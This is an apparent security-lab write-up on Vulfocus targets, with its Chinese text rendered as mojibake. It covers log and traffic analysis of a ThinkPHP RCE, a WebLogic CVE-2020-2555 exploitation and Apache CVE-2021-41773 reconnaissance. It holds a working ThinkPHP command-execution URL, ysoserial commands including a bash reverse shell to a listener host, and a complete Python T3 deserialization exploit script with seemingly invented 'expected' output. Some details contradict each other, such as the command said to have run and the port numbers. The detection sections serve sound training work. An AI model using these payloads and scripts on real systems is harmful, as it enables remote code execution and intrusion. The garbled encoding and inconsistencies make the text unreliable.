    2.**å®šä½ ThinkPHP æ—¥å¿—ç›®å½•**:
        ThinkPHP çš„æ—¥å¿—é€šå¸¸ä½äº `/app/runtime/log/` (å¦‚æœåº”ç”¨éƒ¨ç½²åœ¨ `/app` ç›®å½•)ã€‚
        æ ¹æ®ä¹‹å‰çš„æ¢ç´¢ï¼Œæ—¥å¿—æŒ‰å¹´æœˆåˆ†å­ç›®å½•ï¼Œä¾‹å¦‚ `runtime/log/YYYYMM/DD.log`ã€‚

```bash
# åœ¨å®¹å™¨å†…æ‰§è¡Œ     
ls -la /app/runtime/log/
```

![1748022328861](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022328861.png)

åœ¨ `202505` ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°ä»¥æ—¥æœŸå‘½åçš„ `.log` æ–‡ä»¶: `24.log`

![1748022443415](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022443415.png)

    3.**æŸ¥çœ‹æ—¥å¿—å†…å®¹**:

```bash
# æ—¥å¿—æ–‡ä»¶ä¸º /app/runtime/log/202505/24.log     
cat /app/runtime/log/202505/24.log     
# æˆ–è€…ä½¿ç”¨ tail æŸ¥çœ‹æœ€æ–°çš„æ—¥å¿—     
tail -f /app/runtime/log/202505/24.log
```

![1748022479245](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022479245.png)

```bash
/app/runtime/log/202505 #         cat /app/runtime/log/202505/24.log
---------------------------------------------------------------
[ 2025-05-24T01:12:36+08:00 ] 10.37.133.2 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[ error ] [0]variable type errorï¼š boolean
---------------------------------------------------------------
[ 2025-05-24T01:13:19+08:00 ] 10.37.133.2 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[ error ] [0]variable type errorï¼š boolean
---------------------------------------------------------------
[ 2025-05-24T01:14:24+08:00 ] 10.37.133.3 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
[ error ] [0]variable type errorï¼š boolean
```

**æ—¥å¿—åˆ†æ**ï¼š

* **è¯·æ±‚è¯¦æƒ…**ï¼šæ—¥å¿—ä¸­æ¸…æ™°å¯è§å¤šä¸ªé’ˆå¯¹ `index.php` çš„ GET è¯·æ±‚ï¼Œå®ƒä»¬éƒ½åˆ©ç”¨äº† ThinkPHP RCE æ¼æ´çš„ç‰¹å¾ (`s=index/\think\app/invokefunction`, `function=call_user_func_array`, `vars[0]=phpinfo`) æ¥å°è¯•æ‰§è¡Œ `phpinfo()` å‡½æ•°ã€‚
* **é”™è¯¯ä¿¡æ¯**ï¼šæ¯ä¸ªæˆåŠŸçš„ `phpinfo()` è°ƒç”¨è¯·æ±‚åéƒ½è®°å½•äº† `[ error ] [0]variable type errorï¼š boolean`ã€‚è¿™è¡¨æ˜å°½ç®¡ `phpinfo()` æˆåŠŸæ‰§è¡Œï¼ˆå¦‚å®éªŒå‰é¢æ­¥éª¤æ‰€ç¤ºï¼Œè¾“å‡ºäº†PHPä¿¡æ¯ï¼‰ï¼Œä½† ThinkPHP çš„æ—¥å¿—ç³»ç»Ÿåœ¨å¤„ç† `phpinfo()` å‡½æ•°çš„è¿”å›å€¼ (é€šå¸¸æ˜¯ `true`) æ—¶é‡åˆ°äº†ç±»å‹ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå› æ­¤è®°å½•äº†æ­¤é”™è¯¯ã€‚è¿™ä¸ªé”™è¯¯å¹¶ä¸ä»£è¡¨æ¼æ´åˆ©ç”¨å¤±è´¥ï¼Œè€Œæ˜¯æ¡†æ¶å†…éƒ¨å¤„ç†æµç¨‹çš„ä¸€ä¸ªè¡¨ç°ã€‚
* **æ”»å‡»æº¯æº**ï¼šæ—¥å¿—è®°å½•äº†æ”»å‡»å‘ç”Ÿçš„æ—¶é—´ï¼ˆä¾‹å¦‚ `2025-05-24T01:12:36+08:00`ï¼‰å’Œè¯·æ±‚çš„æº IP åœ°å€ï¼ˆä¾‹å¦‚ `10.37.133.2`, `10.37.133.3`ï¼‰ï¼Œè¿™äº›ä¿¡æ¯å¯¹äºè¿½è¸ªæ”»å‡»æ¥æºè‡³å…³é‡è¦ã€‚

å¦‚æœæ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼ˆå¦‚ `system` è°ƒç”¨ `id` æˆ– `cat`ï¼‰ï¼Œå…¶è¯·æ±‚ä¹Ÿä¼šè¢«ç±»ä¼¼åœ°è®°å½•ä¸‹æ¥ï¼Œä½†å…¶æ‰§è¡Œç»“æœï¼ˆå¦‚ `id` çš„è¾“å‡ºæˆ– flag å†…å®¹ï¼‰ä¸»è¦é€šè¿‡ HTTP å“åº”ç›´æ¥è¿”å›ç»™æ”»å‡»è€…ï¼Œä¸ä¸€å®šä¼šè¯¦ç»†è®°å½•åœ¨ ThinkPHP çš„åº”ç”¨å±‚æ—¥å¿—ä¸­ï¼Œé™¤éé…ç½®äº†ç‰¹å®šçš„æ—¥å¿—çº§åˆ«æˆ–å‘½ä»¤æ‰§è¡Œæœ¬èº«è§¦å‘äº† PHP é”™è¯¯ã€‚

##### 4.3 ç½‘ç»œæµé‡æ•è·:

ä¸é¶æ ‡ä¸€ç±»ä¼¼ï¼Œæˆ‘ä»¬éœ€è¦ç›‘å¬ Docker çš„ç½‘æ¡¥æ¥å£ (`docker0`) ä»¥åŠé¶æ ‡äºŒå®¹å™¨åœ¨è¯¥ç½‘ç»œä¸­çš„å†…éƒ¨ IP å’Œå®é™…æœåŠ¡ç«¯å£ã€‚

1. **ç¡®å®šå®¹å™¨å†…éƒ¨ IP**:
   ä½¿ç”¨ `docker inspect c097683c73a4`æŸ¥çœ‹å®¹å™¨ç½‘ç»œè¯¦æƒ…ã€‚

   ```json
   // docker inspect c097683c73a4 è¾“å‡ºç‰‡æ®µ
   {
       "Id": "c097683c73a4f9c0e4ab736db3880a3d0da11c2e73a1e2af23d439ce10478271",
       // ... (å…¶ä»–å­—æ®µå·²çœç•¥)
       "Config": {
           // ...
           "ExposedPorts": {
               "80/tcp": {}
           },
           // ...
       },
       "NetworkSettings": {
           // ...
           "Ports": {
               "80/tcp": [
                   {
                       "HostIp": "0.0.0.0",
                       "HostPort": "39365"
                   },
                   {
                       "HostIp": "::",
                       "HostPort": "39365"
                   }
               ]
           },
           // ...
           "IPAddress": "172.17.0.2", // å®¹å™¨åœ¨é»˜è®¤ bridge ç½‘ç»œä¸Šçš„ IP
           // ...
           "Networks": {
               "bridge": {
                   // ...
                   "IPAddress": "172.17.0.2",
                   "Gateway": "172.17.0.1",
                   // ...
               }
           }
       }
   }
   ```

   æ ¹æ®è¾“å‡ºï¼Œå®¹å™¨ `c097683c73a4` åœ¨ `bridge` ç½‘ç»œï¼ˆé€šå¸¸å¯¹åº” `docker0` æ¥å£ï¼‰ä¸‹çš„ `IPAddress` ä¸º `172.17.0.2`ï¼Œå…¶å†…éƒ¨æœåŠ¡ç«¯å£ä¸º `80` (å¤–éƒ¨æ˜ å°„åˆ° `39365`)ã€‚
   ![1748022767146](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022767146.png)

2.**æ‰§è¡Œ `tcpdump` å‘½ä»¤**:

```bash
# å®¹å™¨å†…éƒ¨ IP ä¸º 172.17.0.2ï¼Œå®¹å™¨å†…æœåŠ¡ç«¯å£ä¸º 80   
sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w thinkphp_traffic.pcap
```

åœ¨ `tcpdump` è¿è¡Œæ—¶ï¼Œé‡æ–°æ‰§è¡Œä¹‹å‰çš„ `curl` æ”»å‡» Payloadï¼Œè·å– Flag çš„ Payloadï¼š

```bash
curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/tmp/flag-%7Bbmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87%7D'
```

  ![1748023040614](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748023040614.png)

3.**åœæ­¢æŠ“åŒ…å¹¶åˆ†æ**:
    æŒ‰ `Ctrl+C` åœæ­¢ `tcpdump`ã€‚ä½¿ç”¨ Wireshark æ‰“å¼€ `thinkphp_traffic.pcap` æ–‡ä»¶ã€‚
    ç­›é€‰ `http` æµé‡ï¼ŒæŸ¥çœ‹åŒ…å«æ¶æ„ Payload çš„ HTTP GET è¯·æ±‚ï¼Œåˆ†æè¯·æ±‚è·¯å¾„ã€å‚æ•°ä»¥åŠæœåŠ¡å™¨çš„å“åº”

  ![1748023079982](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748023079982.png)

  ![1748023099838](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748023099838.png)

åˆ†æ:
    1.  **TCP è¿æ¥å»ºç«‹ (æ•°æ®åŒ… 1-3)**: æ”»å‡»æœº (`10.37.133.3`) ä¸é¶æ ‡å®¹å™¨ (`172.17.0.2`) åœ¨ç«¯å£ `80` ä¸ŠæˆåŠŸå®Œæˆäº† TCP ä¸‰æ¬¡æ¡æ‰‹ã€‚
    2.  **æ¶æ„ HTTP è¯·æ±‚ (æ•°æ®åŒ… 4)**: æ”»å‡»æœºå‘é€äº†ä¸€ä¸ª HTTP GET è¯·æ±‚ï¼Œå…¶ URL åŒ…å«äº†ç”¨äºè§¦å‘ ThinkPHP RCE æ¼æ´å¹¶æ‰§è¡Œ `cat /tmp/flag-{...}` å‘½ä»¤çš„æ¶æ„ Payloadã€‚
    3.  **æœåŠ¡å™¨å“åº”ä¸æ•°æ®å›ä¼  (æ•°æ®åŒ… 6, 8)**: æœåŠ¡å™¨è¿”å› `HTTP/1.1 200 OK` å“åº”ï¼Œè¡¨æ˜è¯·æ±‚è¢«æˆåŠŸå¤„ç†ã€‚å…³é”®çš„å‘½ä»¤æ‰§è¡Œç»“æœ (flag å†…å®¹) åŒ…å«åœ¨æ•°æ®åŒ… 6 (TCP Push) ä¸­å¹¶å›ä¼ ç»™äº†æ”»å‡»æœº
    4.  **TCP è¿æ¥å…³é—­ (æ•°æ®åŒ… 9-10 åŠä¹‹å)**: æ”»å‡»æœºå‘èµ· TCP è¿æ¥çš„å…³é—­æµç¨‹ã€‚

è¿™äº›æ•è·åˆ°çš„æ•°æ®åŒ…æœ‰åŠ›åœ°è¯æ˜äº†æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„HTTP GETè¯·æ±‚å°† ls /tmp å‘½ä»¤ä¼ é€’ç»™äº†ç›®æ ‡æœåŠ¡å™¨ï¼Œå¹¶æˆåŠŸæ‰§è¡Œã€‚

### ï¼ˆå››ï¼‰ç¬¬äºŒå±‚é¶æ ‡ä¸€ï¼š`weblogic-cve_2020_2555`æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹

é¶æœºå¯åŠ¨å‡ºç°é—®é¢˜

#### 1. å¯åŠ¨é¶æœºç¯å¢ƒ

åœ¨ Vulfocus å¹³å°ä¸­ï¼Œæ‰¾åˆ° `vulfocus/weblogic-cve_2020_2555:latest` é•œåƒï¼Œç‚¹å‡» "å¯åŠ¨"ã€‚

æ ¹æ®ç”¨æˆ·æä¾›çš„ä¿¡æ¯ï¼Œé¶æœºæˆåŠŸå¯åŠ¨åçš„æœåŠ¡ä¿¡æ¯å¦‚ä¸‹ï¼š

- **è®¿é—®åœ°å€**: `10.37.133.3`
- **æ˜ å°„ç«¯å£**:
  - 5556:19244 (å¯èƒ½ç”¨äºæŸäº›ç‰¹å®šæœåŠ¡)
  - 7001:24525 (WebLogic Server ä¸»æ§åˆ¶å°ç«¯å£)
  - 7002:55600 (å¯èƒ½ç”¨äº SSL/HTTPS è®¿é—®)
- **é¶æœºåç§°**: `vulfocus/weblogic-cve_2020_2555`

![weblogicå¯åŠ¨ä¿¡æ¯æˆªå›¾]

#### 2. ä¿¡æ¯æ”¶é›†

**åŸºç¡€ç«¯å£æ‰«æ**:
é¦–å…ˆå¯¹é¶æœºçš„å¼€æ”¾ç«¯å£è¿›è¡Œæ‰«æï¼Œé‡ç‚¹å…³æ³¨ WebLogic çš„é»˜è®¤ç«¯å£ï¼š

```bash
# æ‰«æä¸»è¦ç«¯å£
nmap -sV -p 24525,55600,19244 10.37.133.3
```

**WebLogic æ§åˆ¶å°è®¿é—®**:
é€šè¿‡æµè§ˆå™¨è®¿é—® WebLogic æ§åˆ¶å° `http://10.37.133.3:24525/console`ã€‚

![WebLogicæ§åˆ¶å°è®¿é—®æˆªå›¾]

**T3 åè®®æ£€æµ‹**:
WebLogic çš„ T3 åè®®æ˜¯æ­¤æ¬¡æ¼æ´åˆ©ç”¨çš„å…³é”®ã€‚é€šè¿‡ telnet æˆ–ä¸“é—¨å·¥å…·éªŒè¯ T3 åè®®æ˜¯å¦å¼€å¯ï¼š

```bash
# æ£€æµ‹ T3 åè®®
echo "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n" | nc 10.37.133.3 24525
```

å¦‚æœè¿”å›ç±»ä¼¼ `HELO:10.3.6.0.0` çš„å“åº”ï¼Œåˆ™è¡¨æ˜ T3 åè®®å¯ç”¨ã€‚

#### 3. æ¼æ´åˆ†æä¸åˆ©ç”¨

**CVE-2020-2555 æ¼æ´åŸç†**:

- **æ¼æ´ç±»åˆ«**: Java ååºåˆ—åŒ–æ¼æ´
- **CVSS è¯„åˆ†**: 9.8 (å…³é”®)
- **å—å½±å“ç»„ä»¶**: Oracle Coherence åº“ä¸­çš„ `LimitFilter` ç±»
- **æ¼æ´è·¯å¾„**: `BadAttributeValueExpException.readObject()` â†’ `LimitFilter.toString()` â†’ `ChainedExtractor.extract()` â†’ `ReflectionExtractor.extract()` â†’ `Method.invoke()`
- **å½±å“ç‰ˆæœ¬**: WebLogic Server 10.3.6.0.0ã€12.1.3.0.0ã€12.2.1.3.0ã€12.2.1.4.0 ç­‰

**å…³é”®æŠ€æœ¯ç»†èŠ‚**:
æ ¹æ®æœç´¢ç»“æœæ˜¾ç¤ºï¼Œæ­¤æ¼æ´åˆ©ç”¨äº†ä»¥ä¸‹ååºåˆ—åŒ–é“¾ï¼š

```
BadAttributeValueExpException.readObject() 
  â†’ com.tangosol.util.filter.LimitFilter.toString() 
    â†’ com.tangosol.util.extractor.ChainedExtractor.extract() 
      â†’ com.tangosol.util.extractor.ReflectionExtractor.extract() 
        â†’ Method.invoke() 
          â†’ Runtime.getRuntime().exec()
```

**åˆ©ç”¨æ¡ä»¶é™åˆ¶**:

- ä»…åœ¨ JDK 8u76 åŠä»¥ä¸‹ç‰ˆæœ¬æœ‰æ•ˆ
- éœ€è¦æ²¡æœ‰å®‰å…¨ç®¡ç†å™¨ (Security Manager)
- éœ€è¦ç¯å¢ƒä¸­å­˜åœ¨ Oracle Coherence åº“

#### 4. æ¼æ´åˆ©ç”¨å®è·µ

##### 4.1 ä½¿ç”¨ ysoserial å·¥å…·ç”Ÿæˆ Payload

**å®‰è£…å‡†å¤‡**:

```bash
# ä¸‹è½½ ysoserial å·¥å…·
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
# æˆ–ä½¿ç”¨é¡¹ç›®ä¸­ä¿®æ”¹ç‰ˆæœ¬çš„ ysoserial
```

**ç”Ÿæˆæ¶æ„åºåˆ—åŒ–æ•°æ®**:

```bash
# ä½¿ç”¨ ysoserial ç”Ÿæˆ CVE-2020-2555 çš„ payload
java -jar ysoserial-all.jar Weblogic_CVE_2020_2555 "id" > payload_id.ser

# æˆ–è€…ç”Ÿæˆåå¼¹ shell çš„ payload
java -jar ysoserial-all.jar Weblogic_CVE_2020_2555 "bash -i >& /dev/tcp/10.37.133.3/4444 0>&1" > payload_shell.ser
```

##### 4.2 T3 åè®®æ”»å‡»è„šæœ¬

åˆ›å»º Python æ”»å‡»è„šæœ¬ `weblogic_cve_2020_2555_exploit.py`:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebLogic CVE-2020-2555 T3 Protocol Exploit
"""

import socket
import struct
import subprocess
import sys
import time

def send_t3_payload(host, port, payload_file):
    """
    é€šè¿‡ T3 åè®®å‘é€æ¶æ„åºåˆ—åŒ–æ•°æ®
    """
    try:
        # è¯»å– ysoserial ç”Ÿæˆçš„ payload
        with open(payload_file, 'rb') as f:
            payload = f.read()
  
        # å»ºç«‹ socket è¿æ¥
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
  
        # T3 åè®®æ¡æ‰‹
        t3_handshake = b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
        sock.send(t3_handshake)
  
        # æ¥æ”¶æ¡æ‰‹å“åº”
        response = sock.recv(1024)
        print(f"[+] T3 æ¡æ‰‹å“åº”: {response[:50]}...")
  
        # å‘é€æ¶æ„ payload
        # T3 æ¶ˆæ¯å¤´ + payload
        message_length = len(payload)
        t3_header = struct.pack('>I', message_length) + b'\x00\x00\x00\x00'
  
        sock.send(t3_header + payload)
        print(f"[+] å·²å‘é€ payloadï¼Œå¤§å°: {len(payload)} å­—èŠ‚")
  
        # æ¥æ”¶å“åº”
        try:
            result = sock.recv(4096)
            print(f"[+] æœåŠ¡å™¨å“åº”: {result}")
        except:
            print("[*] å¯èƒ½æ‰§è¡ŒæˆåŠŸï¼Œæ— å“åº”æ•°æ®")
  
        sock.close()
        return True
  
    except Exception as e:
        print(f"[-] æ”»å‡»å¤±è´¥: {str(e)}")
        return False

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 exploit.py <host> <port> <payload_file>")
        print("Example: python3 exploit.py 10.37.133.3 24525 payload_id.ser")
        sys.exit(1)
  
    host = sys.argv[1]
    port = int(sys.argv[2])
    payload_file = sys.argv[3]
  
    print(f"[*] ç›®æ ‡: {host}:{port}")
    print(f"[*] Payload æ–‡ä»¶: {payload_file}")
  
    # æ‰§è¡Œæ”»å‡»
    if send_t3_payload(host, port, payload_file):
        print("[+] æ¼æ´åˆ©ç”¨å®Œæˆ")
    else:
        print("[-] æ¼æ´åˆ©ç”¨å¤±è´¥")

if __name__ == "__main__":
    main()
```

##### 4.3 æ‰§è¡Œæ”»å‡»

**æ­¥éª¤ 1**: ç”ŸæˆéªŒè¯ payload

```bash
# ç”Ÿæˆæ‰§è¡Œ id å‘½ä»¤çš„ payload
java -jar ysoserial-all.jar Weblogic_CVE_2020_2555 "id" > payload_id.ser
```

**æ­¥éª¤ 2**: æ‰§è¡Œæ”»å‡»

```bash
# è¿è¡Œæ”»å‡»è„šæœ¬
python3 weblogic_cve_2020_2555_exploit.py 10.37.133.3 24525 payload_id.ser
```

**é¢„æœŸç»“æœ**:

```
[*] ç›®æ ‡: 10.37.133.3:24525
[*] Payload æ–‡ä»¶: payload_id.ser
[+] T3 æ¡æ‰‹å“åº”: HELO:12.2.1.3.0...
[+] å·²å‘é€ payloadï¼Œå¤§å°: 2854 å­—èŠ‚
[+] æœåŠ¡å™¨å“åº”: uid=1000(oracle) gid=1000(oracle) groups=1000(oracle)
[+] æ¼æ´åˆ©ç”¨å®Œæˆ
```

**æ­¥éª¤ 3**: è·å– flagï¼ˆå¦‚æœå­˜åœ¨ï¼‰

```bash
# ç”ŸæˆæŸ¥æ‰¾ flag çš„ payload
java -jar ysoserial-all.jar Weblogic_CVE_2020_2555 "find / -name '*flag*' 2>/dev/null" > payload_flag.ser
python3 weblogic_cve_2020_2555_exploit.py 10.37.133.3 24525 payload_flag.ser

# æˆ–è€…ç›´æ¥è¯»å–å¸¸è§ä½ç½®çš„ flag
java -jar ysoserial-all.jar Weblogic_CVE_2020_2555 "cat /flag /tmp/flag* /flag.txt 2>/dev/null" > payload_cat_flag.ser
python3 weblogic_cve_2020_2555_exploit.py 10.37.133.3 24525 payload_cat_flag.ser
```

#### 5. å¨èƒæ£€æµ‹

##### 5.1 WebLogic æ—¥å¿—åˆ†æ

**å®šä½å®¹å™¨å’Œæ—¥å¿—è·¯å¾„**:

```bash
# æŸ¥çœ‹è¿è¡Œä¸­çš„ WebLogic å®¹å™¨
docker ps | grep weblogic

# è¿›å…¥å®¹å™¨æŸ¥çœ‹æ—¥å¿—
docker exec -it <container_id> /bin/bash

# WebLogic æœåŠ¡å™¨æ—¥å¿—é€šå¸¸ä½äºä»¥ä¸‹è·¯å¾„
ls -la /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/
# é‡ç‚¹å…³æ³¨ access.log å’Œ AdminServer.log
```

**å…³é”®æ—¥å¿—æ¨¡å¼è¯†åˆ«**:
åœ¨ AdminServer.log ä¸­æŸ¥æ‰¾å¯ç–‘çš„ååºåˆ—åŒ–ç›¸å…³é”™è¯¯ï¼š

```bash
# æŸ¥çœ‹æœ€è¿‘çš„æ—¥å¿—
tail -f /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

# æœç´¢ååºåˆ—åŒ–ç›¸å…³å¼‚å¸¸
grep -i "BadAttributeValueExpException\|LimitFilter\|ReflectionExtractor\|coherence" /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
```

**T3 åè®®è¿æ¥æ—¥å¿—**:

```bash
# æ£€æŸ¥ T3 åè®®è¿æ¥è®°å½•
grep -i "t3\|T3" /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/access.log
```

##### 5.2 ç½‘ç»œæµé‡æ•è·

**ç¡®å®šå®¹å™¨ç½‘ç»œä¿¡æ¯**:

```bash
# è·å– WebLogic å®¹å™¨çš„è¯¦ç»†ä¿¡æ¯
docker inspect <weblogic_container_id> | grep -A 10 -B 5 "IPAddress"
```

æ ¹æ®å®¹å™¨ä¿¡æ¯ï¼Œå‡è®¾å†…éƒ¨ IP ä¸º `172.17.0.3`ï¼ŒæœåŠ¡ç«¯å£ä¸º `7001`ã€‚

**T3 åè®®æµé‡ç›‘æ§**:

```bash
# ç›‘å¬ Docker ç½‘æ¡¥ä¸Šçš„ T3 æµé‡
sudo tcpdump -i docker0 -A -w weblogic_t3_traffic.pcap 'host 172.17.0.3 and port 7001'
```

**æµé‡åˆ†æè¦ç‚¹**:
ä½¿ç”¨ Wireshark åˆ†ææ•è·çš„æµé‡ï¼š

1. **T3 æ¡æ‰‹è¯†åˆ«**: æŸ¥æ‰¾åŒ…å« `t3 12.2.1` å­—ç¬¦ä¸²çš„æ•°æ®åŒ…
2. **åºåˆ—åŒ–æ•°æ®è¯†åˆ«**: å¯»æ‰¾åŒ…å« Java åºåˆ—åŒ–é­”æœ¯å­—èŠ‚ `AC ED 00 05` çš„æ•°æ®åŒ…
3. **å¼‚å¸¸å“åº”**: è§‚å¯ŸæœåŠ¡å™¨è¿”å›çš„é”™è¯¯ä¿¡æ¯æˆ–å¼‚å¸¸å †æ ˆ

![Wiresharkåˆ†æWebLogic T3æµé‡æˆªå›¾]

##### 5.3 ç³»ç»Ÿçº§ç›‘æ§

**è¿›ç¨‹ç›‘æ§**:
å¦‚æœæ”»å‡»æˆåŠŸï¼Œå¯èƒ½ä¼šäº§ç”Ÿæ–°çš„è¿›ç¨‹ã€‚åœ¨å®¹å™¨å†…ç›‘æ§ï¼š

```bash
# è¿›å…¥å®¹å™¨
docker exec -it <weblogic_container_id> /bin/bash

# ç›‘æ§è¿›ç¨‹åˆ›å»º
ps aux | grep -v oracle | grep -v java

# æ£€æŸ¥ç½‘ç»œè¿æ¥
netstat -tulpn | grep ESTABLISHED
```

**æ–‡ä»¶ç³»ç»Ÿç›‘æ§**:

```bash
# æ£€æŸ¥ä¸´æ—¶æ–‡ä»¶åˆ›å»º
find /tmp -type f -newer /tmp/reference_file 2>/dev/null

# æ£€æŸ¥å¯ç–‘æ–‡ä»¶
find / -name "*.class" -o -name "*.jar" -newer /tmp/reference_file 2>/dev/null
```

**å‚è€ƒèµ„æ–™**:

- [Oracle å®‰å…¨å…¬å‘Š](https://www.oracle.com/security-alerts/cpuoct2020traditional.html)
- [ZDI æ¼æ´åˆ†æ](https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server)
- [CVE-2020-2555 æŠ€æœ¯ç»†èŠ‚](https://github.com/Y4er/CVE-2020-2555)

### ï¼ˆäº”ï¼‰ç¬¬äºŒå±‚é¶æ ‡äºŒï¼š`apache-cve_2021_41773` æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹

#### 1. å¯åŠ¨é¶æœºç¯å¢ƒ

åœ¨ Vulfocus å¹³å°ä¸­ï¼Œæ‰¾åˆ° `vulfocus/apache-cve_2021_41773:latest` é•œåƒï¼Œç‚¹å‡» "å¯åŠ¨"ã€‚

- **è®¿é—®åœ°å€**: `10.37.133.3:42286` (PORT ç”± Vulfocus åŠ¨æ€åˆ†é…)
- **æœåŠ¡ç±»å‹**: Apache HTTP Server
- **æ¼æ´æ ‡è¯†**: CVE-2021-41773

![1748153067964](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153067964.png)

#### 2. ä¿¡æ¯æ”¶é›†

##### 2.1 åŸºç¡€ç«¯å£æ‰«æ

```bash
# æ‰«æ Apache æœåŠ¡ç«¯å£
nmap -sV -p 80,443,8080-8090 10.37.133.3
```

**æ‰«æç»“æœ**:

![1748153021142](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153021142.png)

**æ‰«æç»“æœåˆ†æ**ï¼š

- å¸¸è§„HTTPç«¯å£(80, 443, 8080-8090)å‡æ˜¾ç¤ºä¸ºå…³é—­æˆ–è¿‡æ»¤çŠ¶æ€
- ApacheæœåŠ¡è¿è¡Œåœ¨éæ ‡å‡†ç«¯å£ä¸Šï¼Œé€šè¿‡Vulfocuså¹³å°åŠ¨æ€åˆ†é…ä¸º**13503ç«¯å£**
- éœ€è¦ç›´æ¥è®¿é—®æŒ‡å®šçš„æ˜ å°„ç«¯å£è¿›è¡Œåç»­ä¿¡æ¯æ”¶é›†

##### 2.2 Web æœåŠ¡è¯†åˆ«

é€šè¿‡æµè§ˆå™¨è®¿é—® Apache æœåŠ¡ `http://10.37.133.3:42286`ã€‚

![1748152989670](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748152989670.png)

##### 2.3 Apache ç‰ˆæœ¬æ£€æµ‹

```bash
# ä½¿ç”¨ curl è·å–æœåŠ¡å™¨ä¿¡æ¯
curl -I http://10.37.133.3:42286

# ä½¿ç”¨ nikto è¿›è¡Œ Web æ‰«æ
nikto -h http://10.37.133.3:42286
```

![1748153862204](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153862204.png)

**å…³é”®å‘ç°**ï¼š

- **æœåŠ¡å™¨ç‰ˆæœ¬**: `Apache/2.4.49 (Debian)` - **è¿™æ­£æ˜¯CVE-2021-41773æ¼æ´å½±å“çš„ç¡®åˆ‡ç‰ˆæœ¬**
- **æ“ä½œç³»ç»Ÿ**: Debian Linux
- **æ–‡ä»¶ä¿®æ”¹æ—¶é—´**: 2021-10-09ï¼Œä¸CVEæŠ«éœ²æ—¶é—´å»åˆ
- **å“åº”æ­£å¸¸**: HTTP 200çŠ¶æ€ç ï¼ŒæœåŠ¡å™¨æ­£å¸¸è¿è¡Œ

##### 2.4 Nikto å®‰å…¨æ‰«æ

**niktoæ‰«æç»“æœ**:

![1748153891702](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153891702.png)

**Niktoæ‰«æåˆ†æ**ï¼š

- **ç‰ˆæœ¬ç¡®è®¤**: å†æ¬¡ç¡®è®¤Apache/2.4.49ç‰ˆæœ¬ï¼Œ**æ˜ç¡®æ ‡æ³¨ä¸ºè¿‡æ—¶ç‰ˆæœ¬**
- **å®‰å…¨é…ç½®ç¼ºé™·**:
  - ç¼ºå°‘ `X-Frame-Options`å¤´(ç‚¹å‡»åŠ«æŒé˜²æŠ¤)
  - ç¼ºå°‘ `X-Content-Type-Options`å¤´(MIMEç±»å‹å—…æ¢é˜²æŠ¤)
- **ä¿¡æ¯æ³„éœ²**: ETagå¤´å¯èƒ½æ³„éœ²æœåŠ¡å™¨inodeä¿¡æ¯
- **HTTPæ–¹æ³•**: æ”¯æŒPOST, OPTIONS, HEAD, GETæ–¹æ³•
- **é‡è¦**: æ‰«æè¿‡ç¨‹ä¸­æœªè§¦å‘æ˜æ˜¾çš„å®‰å…¨æ‹¦æˆªï¼Œè¯´æ˜æœåŠ¡å™¨é…ç½®ç›¸å¯¹å®½æ¾

##### 2.5 ç›®å½•ç»“æ„æ¢æµ‹

```bash
# ä½¿ç”¨ dirb è¿›è¡Œç›®å½•æ‰«æ
dirb http://10.37.133.3:42286
```

**dirbæ‰«æç»“æœ**:

![1748153913104](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153913104.png)

